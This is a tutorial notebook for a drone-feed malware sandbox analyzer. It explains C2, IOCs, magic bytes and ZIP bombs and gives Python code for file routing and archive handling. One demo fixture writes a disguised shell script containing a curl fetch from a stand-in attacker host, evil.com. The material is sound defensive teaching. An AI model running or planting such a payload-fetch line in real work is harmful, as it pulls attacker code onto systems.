# 🛡️ Sandbox Analyzer — Complete Pipeline
### BEL Project | IIT Bhubaneswar | Detection & Prevention of Malware in RPA/Drone Feeds

---

> **Who is this notebook for?**
> Anyone involved in this project who wants to deeply understand the Sandbox Analyzer module —
> what it is, why every design decision was made, and how the code works line by line.
>
> **You do not need to read anything else.** Every concept, term, and background idea is explained here.

---

## 📋 Table of Contents

| # | Section |
|---|---------|
| 0 | Background Concepts (C2, IOC, Magic Bytes, /proc — explained for beginners) |
| 1 | Setup & Imports |
| 2 | The Big Picture — Where This Module Fits |
| 3 | Stage 1 — File Router |
| 4 | Stage 2 — Archive Handler |
| 5 | Stage 3 — Isolated Execution Environment |
| 6 | Stage 4 — The Four Monitors |
| 7 | Stage 5 — Risk Scoring Engine |
| 8 | Stage 6 — IOC Correlation |
| 9 | Stage 7 — Verdict |
| 10 | Stage 8 — Feedback Loop (Stub — connects to external modules) |
| 11 | Full Pipeline — SandboxAnalyzer class |
| 12 | End-to-End Test |
| 13 | Quick Reference Card |

---

## ⚠️ Important: Module Boundaries

This notebook implements **only the Sandbox Analyzer** — one component inside the larger system.

As per the project architecture (BEL proposal), the full system has **9 modules**:

```
Ingestion Interceptor → Game-Theoretic Threat Estimator → Inspection Strategy Selector
→ [Signature Scanner + AI/ML Classifier + SANDBOX ANALYZER] ← this notebook
→ Metadata Sanitizer → Threat Intelligence Correlator → Response Manager
→ Security Dashboard & Feedback Loop
```

Several functions in this notebook are marked `NOT_IMPLEMENTED` — they represent the
**integration points** where this module connects to other modules. These will be
wired up when the full system is assembled.


---
## Section 0 — Background Concepts

> **Read this first.** These terms appear throughout the notebook. They are explained here
> so you never have to look something up elsewhere.

---

### 0.1 What is Malware?

Malware = **Mal**icious soft**ware**. Any program or file that is designed to harm a system,
steal data, or give an attacker control.

Types relevant to this project:
| Type | What it does |
|------|-------------|
| Virus | Attaches itself to other files and spreads |
| Trojan | Pretends to be a legitimate file, hides its real purpose |
| Ransomware | Encrypts your files and demands payment |
| Dropper | A file whose only job is to secretly download and install other malware |
| Backdoor | Creates a hidden way for attacker to get back into the system later |

---

### 0.2 What is a C2 Server? (Command & Control)

This term appears in the network monitoring section. Here is the full explanation:

**The problem from the attacker's perspective:**
An attacker manages to get a malicious file onto a drone's system. But just getting in is not enough —
they want to *control* what happens next. How do they send instructions to their malware?

**The solution: a C2 server.**

> A **C2 (Command & Control) server** is a computer on the internet controlled by the attacker.
> Once malware runs on the victim's system, it "calls home" to this server to:
> - Receive instructions ("go steal these files", "encrypt everything", "stay quiet for now")
> - Send back stolen data
> - Download additional malware (second-stage payloads)

**Real-world analogy:**
Think of it like a spy that has already infiltrated a building. The spy needs to report back to
headquarters and receive new orders. The C2 server is that headquarters.

**Example flow:**
```
Drone system (infected)          Attacker's C2 server
        │                               │
        │── "I'm alive, what do I do?" ─►│
        │◄─ "Steal the mission files" ───│
        │── "Here are the files" ────────►│
        │◄─ "Now delete yourself" ────────│
```

**Why does our sandbox care about C2?**
If a file we're running inside the sandbox tries to make an outbound internet connection — especially
to a known malicious IP — that is one of the strongest indicators it's malware. Legitimate drone
telemetry files do not "call home" to external servers.

**Key insight:** Our network monitor catches C2 callbacks even if the connection *fails*
(because we're in an isolated environment with no real internet). The *attempt* itself is recorded.

📖 **Further reading:** [Varonis: What is C2?](https://www.varonis.com/blog/what-is-c2) |
[CrowdStrike: C2 Attacks Explained](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/command-and-control-cac-attack/)

---

### 0.3 What is an IOC? (Indicator of Compromise)

**IOC = Indicator of Compromise.** A piece of evidence that a system has been attacked or
compromised.

Examples:
| IOC Type | Example | What it means |
|----------|---------|--------------|
| File hash | `d41d8cd98f00b204e...` | A fingerprint of a known malware file |
| IP address | `203.0.113.42` | A server known to be used by attackers |
| Domain | `evil-c2.example.com` | A website used to distribute malware |
| File path | `/tmp/.hidden` | A path known to be used by malware droppers |

**Where do IOC lists come from?**
Security researchers, threat intelligence companies (like VirusTotal, AlienVault OTX), and
government agencies publish lists of known IOCs. Our sandbox checks against these lists.

**In our implementation:** We have a stub IOC database. In production, this would connect
to a live threat intelligence feed — that's the **Threat Intelligence Correlator** module
(a separate module in the project, not implemented here).

---

### 0.4 What are Magic Bytes?

Every file format starts with a specific sequence of bytes. These bytes are called the **magic bytes**
or **magic number** — they identify the file's true type regardless of its extension.

**Why does this matter?**
An attacker can rename a malicious Python script from `malware.py` to `photo.jpg`.
Your operating system and many scanners will think it's an image. But the first few bytes
of the file will reveal the truth.

**Examples:**
```
File type    First bytes (hex)     First bytes (readable)
─────────────────────────────────────────────────────────
JPEG image   FF D8 FF              ÿØÿ
PNG image    89 50 4E 47           .PNG
ZIP archive  50 4B 03 04           PK..
PDF          25 50 44 46           %PDF
Linux binary 7F 45 4C 46           .ELF
Windows EXE  4D 5A                 MZ
Python/Shell 23 21                 #!  (shebang line)
```

**Example:** If a file is named `mission_photo.jpg` but its first bytes are `#!` — we know
it's actually a shell script, regardless of its name. Our File Router catches this.

---

### 0.5 What is the Linux /proc Filesystem?

Our four monitors all read from `/proc`. Here's what that means:

Linux has a special folder called `/proc`. It is **not a real folder on disk** — it's a
virtual filesystem that the Linux kernel maintains in memory. It exposes the kernel's
internal state as if it were files you can read.

**The key part for us:** Every running process gets its own folder inside `/proc`:
```
/proc/
  ├── 1234/               ← folder for process with PID 1234
  │    ├── fd/            ← which files this process has open
  │    ├── fdinfo/        ← how those files are opened (read? write?)
  │    ├── status         ← memory usage, permissions, capabilities
  │    └── ...
  ├── net/
  │    ├── tcp            ← all current TCP connections on the system
  │    └── udp            ← all current UDP connections
  └── ...
```

**Why use /proc instead of other methods?**
- It's always there — no installation needed
- The process being monitored **cannot manipulate what /proc says about itself**
- Reading from /proc takes microseconds — it's essentially free
- No code is injected into the monitored process

This is exactly how production security tools like auditd and many EDR agents work.

---

### 0.6 What is a ZIP Bomb?

A **ZIP bomb** (also called a decompression bomb) is a specially crafted ZIP file that
expands to an enormous size when extracted — designed to crash or freeze the program
trying to unzip it.

**Famous example: 42.zip**
- Compressed size: **42 KB**
- Uncompressed size: **4.5 petabytes** (4,500,000 GB)
- It achieves this by nesting compressed files inside each other

**How do we detect it?**
We check the compression ratio before extracting:
```
compression_ratio = compressed_size / uncompressed_size
```
If this ratio is suspiciously small (e.g. 0.0001 — meaning 1 MB compresses to 0.1 KB),
and the uncompressed size is large — we flag it as a ZIP bomb and skip extraction.

---

### 0.7 Static vs Dynamic Analysis

Two fundamental approaches to malware detection. Understanding this distinction is the
foundation of why a sandbox is needed.

| | Static Analysis | Dynamic Analysis (Sandbox) |
|--|--|--|
| **What it does** | Examines the file without running it | Actually executes the file and observes |
| **Speed** | Milliseconds | 5–30 seconds |
| **What it catches** | Known malware (matching signatures), suspicious patterns | Any malicious behaviour, including brand new threats |
| **Can it be evaded?** | Yes — obfuscate the code, change a few bytes | Very hard — you cannot hide *what you do* |
| **Used in our system** | Layer 1 (Signature Scanner), Layer 2 (AI/ML) | Layer 3 (Sandbox — this module) |

**The key insight:** A sophisticated attacker can rewrite their malware code every time so it
looks different to any scanner. But once it runs, it has to do something malicious —
and that behaviour cannot be hidden.

📖 Research backing this principle: *"Dynamic analysis provides more trustworthy detection
performance — especially for encrypted malware where static analysis is insufficient."*
— [Guven, M. (2024), IJCESEN: Dynamic Malware Analysis Using Sandbox & AI](https://doi.org/10.22399/ijcesen.460)


---
## Section 1 — Setup & Imports

In [ ]:
# Install dependencies
# psutil  : reads process information (used by process monitor)
# hashlib : computes file hashes (used by IOC correlation — built into Python)
# zipfile : handles ZIP archives (built into Python)
# resource: sets kernel-level limits (built into Python, Linux/Colab only)

!pip install psutil --quiet
print('✅ Dependencies ready')

✅ Dependencies ready


In [ ]:
import os, sys, time, zipfile, hashlib, shutil, tempfile
import threading, subprocess, resource, signal
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum

try:
    import psutil
    print('✅ psutil loaded')
except ImportError:
    print('❌ psutil missing — run the cell above first')

# ─── Mermaid diagram helper ───────────────────────────────────────────────────
# Mermaid is not natively supported in Colab. We use mermaid.ink — a free online
# API that renders Mermaid code to an image. Requires internet access.
# If offline, diagrams will not render — but the ASCII text diagrams still work.

import base64
from IPython.display import Image, display

def show_mermaid(graph_code: str, caption: str = ''):
    """Render a Mermaid diagram inline in Colab using mermaid.ink API."""
    try:
        encoded = base64.urlsafe_b64encode(graph_code.encode('utf-8')).decode('utf-8')
        url = f'https://mermaid.ink/img/{encoded}'
        if caption:
            print(f'📊 {caption}')
        display(Image(url=url, width=900))
    except Exception as e:
        print(f'[Mermaid render failed: {e}]')
        print('Falling back to text diagram.')
        print(graph_code)

print('✅ All imports done. Mermaid helper ready.')

✅ psutil loaded
✅ All imports done. Mermaid helper ready.


---
## Section 2 — The Big Picture

### 🔵 Theory

Our system has **9 modules**. The Sandbox Analyzer is one of them — specifically it is
**Layer 3 of the Multi-Layer Malware Detection Engine**.

The sandbox only activates when the Game-Theoretic Threat Estimator assigns a **HIGH threat score**.
This is a deliberate design choice: the sandbox takes 5–30 seconds per file, so running it on
every drone file would create unacceptable latency. The estimator acts as a filter.

---

### 📊 Full System Architecture (ASCII)

```
DRONE / RPA
    │
    ▼
┌────────────────────────────────────────────────────────────────────┐
│               EDGE MALWARE DETECTION ENGINE                         │
│                                                                     │
│  ① Ingestion Interceptor                                            │
│     Authenticate drone source. Validate format.                    │
│     Flag ZIP/encrypted files for deep inspection.                  │
│          │                                                          │
│          ▼                                                          │
│  ② Game-Theoretic Threat Estimator  (Stackelberg + Bayesian)       │
│     Compute Threat Score (0–100) based on metadata anomalies,      │
│     source trust, mission context.                                  │
│          │                                                          │
│          ▼                                                          │
│  ③ Inspection Strategy Selector                                     │
│     LOW  → Layer 1 only                                            │
│     MED  → Layer 1 + Layer 2                                       │
│     HIGH → All 3 layers ──────────────────────────┐               │
│          │                                         │               │
│          ▼                                         ▼               │
│  ④ Signature Scanner    ⑤ AI/ML Classifier    ⑥ SANDBOX ◄── here  │
│                                                    │               │
│          ▼                                         │               │
│  ⑦ Metadata Sanitizer ◄───────────────────────────┘               │
│  ⑧ Threat Intelligence Correlator                                  │
│  ⑨ Response & Quarantine Manager                                   │
│          │                                                          │
│          ▼                                                          │
│  Security Dashboard & Feedback Loop                                 │
└────────────────────────────────────────────────────────────────────┘
```

---

### 📊 Inside the Sandbox — 8 Stages (ASCII)

```
Suspicious file (HIGH threat score from estimator)
      │
      ▼
 ┌───────────────────────────────────────────────────────┐
 │                 SANDBOX ANALYZER                       │
 │                                                        │
 │  Stage 1: File Router                                  │
 │    Identify real file type via magic bytes             │
 │    Skip safe types. Block Windows executables.         │
 │           │                                            │
 │           ▼                                            │
 │  Stage 2: Archive Handler (if ZIP/archive)             │
 │    Flag encrypted archive as suspicious (no cracking)  │
 │    Inspect manifest. Detect ZIP bombs.                 │
 │    Extract. Recurse up to depth 3.                     │
 │           │                                            │
 │           ▼                                            │
 │  Stage 3: Execution Environment Builder                │
 │    Kernel-level resource limits (128MB RAM, 20s CPU)   │
 │    Isolated temp dir. Empty env vars. 30s timeout.     │
 │           │                                            │
 │           ▼                                            │
 │  Stage 4: File Executor + 4 Parallel Monitors          │
 │  ┌─────────────────────────────────────────────────┐  │
 │  │  File runs → Monitor 1: File System (/proc/fd)  │  │
 │  │           → Monitor 2: Network (/proc/net/tcp)  │  │
 │  │           → Monitor 3: Processes (psutil)       │  │
 │  │           → Monitor 4: Privileges (/proc/status)│  │
 │  └─────────────────────────────────────────────────┘  │
 │           │                                            │
 │           ▼                                            │
 │  Stage 5: Risk Scoring Engine                          │
 │    Sum event weights → total risk score                │
 │           │                                            │
 │           ▼                                            │
 │  Stage 6: IOC Correlation  [calls Threat Intel module] │
 │    Hash, IPs, domains vs threat intelligence DB        │
 │           │                                            │
 │           ▼                                            │
 │  Stage 7: Verdict                                      │
 │    CLEAN / SUSPICIOUS / MALICIOUS                      │
 │           │                                            │
 │           ▼                                            │
 │  Stage 8: Feedback (stub — calls external modules)     │
 │    → ML Classifier, Threat Estimator, Dashboard        │
 └───────────────────────────────────────────────────────┘
```


In [ ]:
# ─── Mermaid version of the same diagram ──────────────────────────────────────
# This renders as a visual flowchart if you have internet access.
# The ASCII diagram above is still the primary reference.

mermaid_full_pipeline = '''
flowchart TD
    DRONE([🚁 Drone / RPA Feed]) --> II
    II[① Ingestion Interceptor] --> GTE
    GTE[② Game-Theoretic\nThreat Estimator] --> ISS
    ISS{③ Inspection\nStrategy Selector}
    ISS -->|LOW| SS[④ Signature Scanner]
    ISS -->|MEDIUM| ML[⑤ AI/ML Classifier]
    ISS -->|HIGH| SB[⑥ SANDBOX ANALYZER\n← THIS MODULE]
    SS --> MS
    ML --> MS
    SB --> MS
    MS[⑦ Metadata Sanitizer] --> TIC
    TIC[⑧ Threat Intelligence\nCorrelator] --> RQM
    RQM[⑨ Response &\nQuarantine Manager] --> OUT([✅ Operational Network\nor 🚫 Blocked])

    style SB fill:#1B3A5C,color:#fff,stroke:#2471A3,stroke-width:3px
    style ISS fill:#2471A3,color:#fff
'''
show_mermaid(mermaid_full_pipeline, 'Full System Pipeline')

📊 Full System Pipeline


In [ ]:
# ─── Mermaid: Inside the Sandbox ──────────────────────────────────────────────
mermaid_sandbox_internals = '''
flowchart TD
    IN([Suspicious File\nHigh Threat Score]) --> S1
    S1[Stage 1\nFile Router] -->|Archive| S2
    S1 -->|Script/Binary| S3
    S1 -->|Safe file| SKIP([Skip — return CLEAN])
    S1 -->|Windows EXE| WIN([Flag for manual review])
    S2[Stage 2\nArchive Handler] --> S3
    S3[Stage 3\nIsolated Environment] --> S4
    S4[Stage 4\nExecute + 4 Monitors]
    S4 --> M1[Monitor 1\nFile System]
    S4 --> M2[Monitor 2\nNetwork]
    S4 --> M3[Monitor 3\nProcesses]
    S4 --> M4[Monitor 4\nPrivileges]
    M1 & M2 & M3 & M4 --> S5
    S5[Stage 5\nRisk Scoring] --> S6
    S6[Stage 6\nIOC Correlation\n⚠️ calls external module] --> S7
    S7[Stage 7\nVerdict] --> S8
    S8[Stage 8\nFeedback Loop\n⚠️ stubs only] --> OUT([SandboxReport returned])

    style S6 fill:#CA6F1E,color:#fff
    style S8 fill:#CA6F1E,color:#fff
    style SKIP fill:#1E8449,color:#fff
    style WIN fill:#C0392B,color:#fff
'''
show_mermaid(mermaid_sandbox_internals, 'Inside the Sandbox — 8 Stages')

📊 Inside the Sandbox — 8 Stages


---
## Section 3 — Stage 1: File Router

### 🔵 Theory

The File Router is the entry gate. Before doing anything else, we need to know:
1. **What type of file is this?** (not just from the extension — from the actual bytes)
2. **Should we skip it?** (safe types like plain CSV don't need deep analysis)
3. **How do we run it?** (Python scripts need `python3`, shell scripts need `bash`, etc.)

**Why not just trust the file extension?**

Extensions are trivial to fake. An attacker can rename `backdoor.sh` to `telemetry.csv`.
We read the first 16 bytes of every file — the **magic bytes** — to verify the true type.
(See Section 0.4 for a full explanation of magic bytes.)

**What about Windows executables (.exe)?**

Our sandbox runs on Linux. We cannot safely execute Windows PE binaries.
Currently we flag them for manual review. Full sandboxing of `.exe` files requires
a Windows VM (QEMU/KVM) — that is a future extension.

---

### 📊 Routing Decision Tree (ASCII)

```
File arrives
    │
    ├─► Read first 16 bytes (magic bytes)
    │       │
    │       ├─ PK\x03\x04     → ARCHIVE  → send to Stage 2 (Archive Handler)
    │       ├─ \x7fELF         → EXECUTABLE → run directly
    │       ├─ #!              → SCRIPT  → run with interpreter
    │       ├─ MZ              → WINDOWS → flag, do NOT execute
    │       └─ no match        → use extension as fallback
    │
    ├─► Extension fallback
    │       ├─ .py / .sh → SCRIPT
    │       ├─ .txt / .csv → SAFE → skip (return CLEAN immediately)
    │       └─ unknown → UNKNOWN → treat as suspicious
    │
    └─► Assign interpreter (python3 for .py, bash for .sh, etc.)
```


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 1: File Router
# ─────────────────────────────────────────────────────────────────────────────

class FileCategory(Enum):
    EXECUTABLE = 'executable'   # Linux ELF binary
    SCRIPT     = 'script'       # .py, .sh, .rb
    ARCHIVE    = 'archive'      # .zip, .tar, .gz
    IMAGE      = 'image'        # .jpg, .png
    DOCUMENT   = 'document'     # .pdf
    SAFE       = 'safe'         # .txt, .csv — skip deep analysis
    WINDOWS    = 'windows'      # .exe, .dll — needs Windows VM, flag only
    UNKNOWN    = 'unknown'      # treat as suspicious


# Magic bytes: the first bytes of a file that identify its true format.
# We check these BEFORE trusting the file extension.
# Source: https://en.wikipedia.org/wiki/List_of_file_signatures
MAGIC_BYTES = {
    b'PK\x03\x04': FileCategory.ARCHIVE,     # ZIP (most common)
    b'PK\x05\x06': FileCategory.ARCHIVE,     # ZIP (empty archive)
    b'\x7fELF'   : FileCategory.EXECUTABLE,  # Linux ELF binary
    b'\xff\xd8\xff': FileCategory.IMAGE,    # JPEG image
    b'\x89PNG'   : FileCategory.IMAGE,        # PNG image
    b'%PDF'       : FileCategory.DOCUMENT,     # PDF document
    b'MZ'         : FileCategory.WINDOWS,      # Windows PE (.exe, .dll)
    b'#!'         : FileCategory.SCRIPT,       # Shebang (#!/bin/bash, #!/usr/bin/env python3)
}

# Extension fallback — used only if magic bytes don't match anything
EXTENSION_MAP = {
    '.py': FileCategory.SCRIPT,    '.sh': FileCategory.SCRIPT,
    '.rb': FileCategory.SCRIPT,    '.pl': FileCategory.SCRIPT,
    '.zip': FileCategory.ARCHIVE,  '.tar': FileCategory.ARCHIVE,
    '.gz': FileCategory.ARCHIVE,
    '.jpg': FileCategory.IMAGE,    '.jpeg': FileCategory.IMAGE,
    '.png': FileCategory.IMAGE,
    '.pdf': FileCategory.DOCUMENT,
    '.txt': FileCategory.SAFE,     '.csv': FileCategory.SAFE,
    '.exe': FileCategory.WINDOWS,  '.dll': FileCategory.WINDOWS,
    '.ps1': FileCategory.WINDOWS,  '.bat': FileCategory.WINDOWS,
}

# Which interpreter to use for each script type
INTERPRETER_MAP = {
    '.py': 'python3', '.sh': 'bash', '.rb': 'ruby', '.pl': 'perl',
}


def route_file(file_path: str) -> dict:
    """
    Read a file's magic bytes and extension to determine its type.

    Returns:
      category    : FileCategory enum value
      interpreter : e.g. 'python3' or None
      should_skip : True if file is safe to skip
      magic_match : True if type was confirmed via magic bytes (more reliable)
      details     : human-readable explanation
    """
    path = Path(file_path)
    ext  = path.suffix.lower()

    # Step 1: Read first 16 bytes to check magic bytes
    magic_category = None
    try:
        with open(file_path, 'rb') as f:
            header = f.read(16)
        for magic, cat in MAGIC_BYTES.items():
            if header.startswith(magic):
                magic_category = cat
                break
    except Exception:
        header = b''

    # Step 2: Magic bytes take priority over extension
    if magic_category:
        category, magic_match = magic_category, True
    else:
        category, magic_match = EXTENSION_MAP.get(ext, FileCategory.UNKNOWN), False

    interpreter = INTERPRETER_MAP.get(ext) if category == FileCategory.SCRIPT else None
    should_skip = (category == FileCategory.SAFE)

    reason_map = {
        FileCategory.EXECUTABLE: 'Linux ELF binary — will execute directly',
        FileCategory.SCRIPT    : f'Script — interpreter: {interpreter or ext}',
        FileCategory.ARCHIVE   : 'Archive — will be extracted and each file sandboxed',
        FileCategory.IMAGE     : 'Image — will be inspected for embedded payloads',
        FileCategory.DOCUMENT  : 'Document — will be executed in sandboxed environment',
        FileCategory.SAFE      : 'Plain data file — skipping deep analysis (safe)',
        FileCategory.WINDOWS   : 'Windows executable — cannot run on Linux; flagged for manual review',
        FileCategory.UNKNOWN   : 'Unknown type — treating as suspicious',
    }

    return {
        'category'   : category,
        'interpreter': interpreter,
        'should_skip': should_skip,
        'magic_match': magic_match,
        'details'    : reason_map[category],
    }

print('✅ File Router ready')

✅ File Router ready


In [ ]:
# ─── DEMO: File Router ────────────────────────────────────────────────────────
# We create 5 test files — including a disguised one — and see how the router classifies them.

demo_dir = tempfile.mkdtemp(prefix='router_demo_')

test_files = {}

# 1. Normal Python script
p = os.path.join(demo_dir, 'analysis.py')
open(p, 'w').write('print("hello")')
test_files['analysis.py'] = p

# 2. Safe CSV (telemetry)
p = os.path.join(demo_dir, 'telemetry.csv')
open(p, 'w').write('lat,lon,alt\n28.6,77.2,120')
test_files['telemetry.csv'] = p

# 3. DISGUISED FILE: named .jpg but actually a shell script
# This is a classic attacker technique: rename malware to look like an image
p = os.path.join(demo_dir, 'photo.jpg')
open(p, 'w').write('#!/bin/bash\ncurl http://evil.com/payload')  # starts with #!
test_files['photo.jpg (actually shell script!)'] = p

# 4. Legitimate ZIP archive
p = os.path.join(demo_dir, 'mission_data.zip')
with zipfile.ZipFile(p, 'w') as zf:
    zf.writestr('log.csv', 'data')
test_files['mission_data.zip'] = p

# 5. Windows EXE (magic bytes MZ)
p = os.path.join(demo_dir, 'payload.exe')
with open(p, 'wb') as f:
    f.write(b'MZ' + b'\x00' * 10)
test_files['payload.exe'] = p

print(f"{'FILE':<42} {'CATEGORY':<16} {'MAGIC?':<8} {'SKIP?':<7} NOTES")
print('─' * 105)
for name, path in test_files.items():
    r = route_file(path)
    print(f"{name:<42} {r['category'].value:<16} "
          f"{'✅ YES' if r['magic_match'] else '❌ no':<8} "
          f"{'YES' if r['should_skip'] else 'no':<7} "
          f"{r['details']}")

print()
print('🔍 KEY OBSERVATION: photo.jpg is correctly identified as SCRIPT via magic bytes.')
print('   Even though the extension is .jpg, the file starts with #! (shebang)')
print('   → Extension alone CANNOT be trusted. Magic bytes are the ground truth.')

FILE                                       CATEGORY         MAGIC?   SKIP?   NOTES
─────────────────────────────────────────────────────────────────────────────────────────────────────────
analysis.py                                script           ❌ no     no      Script — interpreter: python3
telemetry.csv                              safe             ❌ no     YES     Plain data file — skipping deep analysis (safe)
photo.jpg (actually shell script!)         script           ✅ YES    no      Script — interpreter: .jpg
mission_data.zip                           archive          ✅ YES    no      Archive — will be extracted and each file sandboxed
payload.exe                                windows          ✅ YES    no      Windows executable — cannot run on Linux; flagged for manual review

🔍 KEY OBSERVATION: photo.jpg is correctly identified as SCRIPT via magic bytes.
   Even though the extension is .jpg, the file starts with #! (shebang)
   → Extension alone CANNOT be trusted. Magic by

---
## Section 4 — Stage 2: Archive Handler

### 🔵 Theory

Drone feeds frequently arrive as ZIP archives — this is completely legitimate for
compressing video and telemetry data to save bandwidth.

But attackers also use ZIPs deliberately. According to **HP Wolf Security Threat Insights Reports**
(Q3 2022 – Q1 2023), archives became the **#1 malware delivery mechanism**, surpassing
Office documents for the first time.

> *"Archives were the most popular file type for delivering malware (42–44%). Archives are
> attractive to threat actors because they are easily encrypted, making them difficult for
> web proxies, sandboxes, and email scanners to detect malware."*
> — [HP Wolf Security Q4 2022 Report](https://threatresearch.ext.hp.com/hp-wolf-security-threat-insights-report-q4-2022/)

Two key attack techniques:
1. **Encrypted archives** — a password-protected ZIP hides the malware from scanners
2. **Double extension** — `recon.jpg.sh` looks like an image, but the `.sh` is the real extension

---

### ❌ Design Decision: No Password Cracking

**Previous approach (removed):** We tried a list of common passwords like `infected`, `malware`.

**Why we removed it:**

That practice came from the **security research community** — researchers use those standard
passwords when *sharing malware samples* for analysis. The passwords are not secret; they
are a convention.

However, in our threat model — a sophisticated attacker injecting malware into a military
drone feed — there is zero reason to expect they would use `infected` as their password.
A determined adversary would use a custom, randomly generated key that no dictionary would ever crack.

**New approach:** If a ZIP is encrypted and no password is provided in the feed metadata,
we treat the archive itself as suspicious:

> An encrypted archive arriving in a drone feed with no declared decryption key is a
> suspicious indicator — legitimate drone telemetry does not arrive padlocked.

This stance is actually supported by the same HP Wolf Security research: the real
danger of encrypted ZIPs is precisely that they *bypass* automated analysis.
Our correct response is to flag them, not to guess passwords.

📖 **Source:** [HP Wolf Security: Archive Malware Rise](https://threatresearch.ext.hp.com/hp-wolf-security-threat-insights-report-q4-2022/)

---

### 📊 Archive Handler Flow (ASCII)

```
ZIP file arrives
     │
     ├─► Is it encrypted?
     │       ├─ YES, but password provided in metadata → decrypt and proceed
     │       ├─ YES, no password → ADD +25 to risk score, flag, skip extraction
     │       └─ NO → proceed
     │
     ├─► Inspect file listing (BEFORE extracting)
     │       ├─ Double extension? (e.g. photo.jpg.sh) → FLAG +30 points
     │       └─ ZIP bomb? (ratio < 0.5%, size > 10 MB) → FLAG, abort
     │
     ├─► Extract to isolated temp directory
     │
     └─► For each file inside:
             └─ Is it another ZIP? → recurse (max depth = 3)
```


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 2: Archive Handler
# ─────────────────────────────────────────────────────────────────────────────

MAX_EXTRACT_DEPTH  = 3       # Max nesting: ZIP inside ZIP inside ZIP
ZIP_BOMB_RATIO     = 0.005   # If compressed/uncompressed < 0.5%, suspect ZIP bomb
ZIP_BOMB_MIN_SIZE  = 10 * 1024 * 1024  # Only check ratio if uncompressed > 10 MB

# Risk points added for suspicious archive indicators
ENCRYPTED_NO_KEY_SCORE = 25   # encrypted archive with no provided key
DOUBLE_EXTENSION_SCORE = 30   # file inside archive has double extension


@dataclass
class ArchiveResult:
    """All findings from processing an archive."""
    success           : bool = False
    extracted_files   : List[str] = field(default_factory=list)
    was_encrypted     : bool = False
    decryption_source : str = ''     # 'metadata_key' or '' (none)
    double_extensions : List[str] = field(default_factory=list)
    zip_bomb_detected : bool = False
    error             : Optional[str] = None
    suspicious_flags  : List[str] = field(default_factory=list)
    extra_risk_score  : int = 0      # risk points added by archive handling itself


def is_encrypted_zip(zip_path: str) -> bool:
    """Check if any file in the ZIP requires a password."""
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for info in zf.infolist():
                if info.flag_bits & 0x1:   # bit 0 = encrypted
                    return True
        return False
    except Exception:
        return False


def check_double_extension(filename: str) -> bool:
    """
    Detect double-extension disguise: e.g. 'recon.jpg.sh'
    The outer extension (.sh) is the real one; .jpg is the disguise.
    """
    parts = filename.lower().split('.')
    if len(parts) < 3:
        return False
    dangerous_final = {'.exe', '.sh', '.py', '.bat', '.ps1', '.dll', '.vbs', '.rb'}
    safe_middle     = {'.jpg', '.jpeg', '.png', '.gif', '.pdf', '.doc', '.txt', '.csv', '.mp4'}
    return ('.' + parts[-2]) in safe_middle and ('.' + parts[-1]) in dangerous_final


def handle_archive(zip_path: str, output_dir: str,
                   provided_password: Optional[str] = None,
                   depth: int = 0) -> ArchiveResult:
    """
    Full archive handling:
    1. Check encryption
    2. If encrypted: use provided_password from metadata, or flag as suspicious
    3. Inspect file listing for double extensions and ZIP bombs
    4. Extract
    5. Recurse on nested ZIPs

    provided_password: password from feed metadata (if any). In a real deployment,
                       the drone's ground control station would supply this.
    """
    result = ArchiveResult()

    if depth > MAX_EXTRACT_DEPTH:
        result.error = f'Max extraction depth ({MAX_EXTRACT_DEPTH}) reached'
        return result

    encrypted = is_encrypted_zip(zip_path)
    result.was_encrypted = encrypted

    pwd_bytes = None
    if encrypted:
        if provided_password:
            # Password came from feed metadata — legitimate use case
            pwd_bytes = provided_password.encode()
            result.decryption_source = 'metadata_key'
        else:
            # Encrypted with no declared key — this is itself suspicious.
            # We do NOT try to guess passwords (see theory section above).
            result.extra_risk_score += ENCRYPTED_NO_KEY_SCORE
            result.suspicious_flags.append(
                f'Encrypted archive with no declared decryption key '
                f'(+{ENCRYPTED_NO_KEY_SCORE} risk). Extraction skipped.'
            )
            result.error = 'Encrypted — no key provided. Flagged as suspicious.'
            return result

    # Inspect file listing before extracting
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            if pwd_bytes:
                zf.setpassword(pwd_bytes)

            for info in zf.infolist():
                fname = info.filename

                # Double extension check
                if check_double_extension(fname):
                    result.double_extensions.append(fname)
                    result.extra_risk_score += DOUBLE_EXTENSION_SCORE
                    result.suspicious_flags.append(
                        f'Double extension disguise: {fname} (+{DOUBLE_EXTENSION_SCORE} risk)'
                    )

                # ZIP bomb check
                # A zip bomb is a tiny file that explodes to enormous size when extracted.
                # Example: 42.zip — 42 KB compressed, 4.5 petabytes uncompressed.
                # Detection: compressed_size / uncompressed_size is absurdly small.
                if (info.file_size > ZIP_BOMB_MIN_SIZE and
                    info.compress_size > 0 and
                    (info.compress_size / info.file_size) < ZIP_BOMB_RATIO):
                    result.zip_bomb_detected = True
                    result.suspicious_flags.append(
                        f'ZIP bomb suspected: {fname} '
                        f'({info.compress_size:,} bytes compressed → '
                        f'{info.file_size:,} bytes uncompressed)'
                    )

            if result.zip_bomb_detected:
                result.error = 'ZIP bomb detected — extraction aborted'
                return result

            os.makedirs(output_dir, exist_ok=True)
            zf.extractall(output_dir)

    except Exception as e:
        result.error = f'Extraction failed: {e}'
        return result

    # Recurse on nested ZIPs
    for fname in os.listdir(output_dir):
        fpath = os.path.join(output_dir, fname)
        if fname.lower().endswith('.zip') and os.path.isfile(fpath):
            sub_dir    = fpath + '_extracted'
            sub_result = handle_archive(fpath, sub_dir, provided_password, depth + 1)
            result.extracted_files.extend(sub_result.extracted_files)
            result.suspicious_flags.extend(sub_result.suspicious_flags)
            result.extra_risk_score += sub_result.extra_risk_score
        else:
            result.extracted_files.append(fpath)

    result.success = True
    return result

print('✅ Archive Handler ready (no password cracking — encrypted = suspicious flag)')

✅ Archive Handler ready (no password cracking — encrypted = suspicious flag)


In [ ]:
# ─── DEMO: Archive Handler ────────────────────────────────────────────────────
demo_dir = tempfile.mkdtemp(prefix='archive_demo_')

def print_arc(label, r):
    print(f'\n📦 {label}')
    print(f'   Success         : {r.success}')
    print(f'   Was encrypted   : {r.was_encrypted}')
    print(f'   Decryption src  : {r.decryption_source or "N/A"}')
    print(f'   Extra risk pts  : +{r.extra_risk_score}')
    print(f'   Files extracted : {[os.path.basename(f) for f in r.extracted_files]}')
    for flag in r.suspicious_flags:
        print(f'   ⚠️  {flag}')
    if r.error: print(f'   ❌ {r.error}')
